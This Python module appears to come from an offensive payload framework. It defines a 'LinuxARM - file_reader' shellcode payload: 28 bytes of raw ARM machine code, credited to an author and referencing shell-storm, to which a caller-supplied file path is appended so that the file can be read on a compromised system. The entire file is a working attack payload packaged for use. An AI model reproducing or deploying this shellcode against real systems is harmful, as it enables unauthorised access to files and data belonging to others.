from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "gunslinger"
    Shellcode.info["name"] = "LinuxARM - file_reader shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-853.php"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 28 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46"              
            r"\x10\x30\xff\x21\xff\x31\x01\x31\x0f\x37"              
            r"\x01\xdf\x40\x40\x01\x27\x01\xdf"
            + kwargs["file"]

        ]
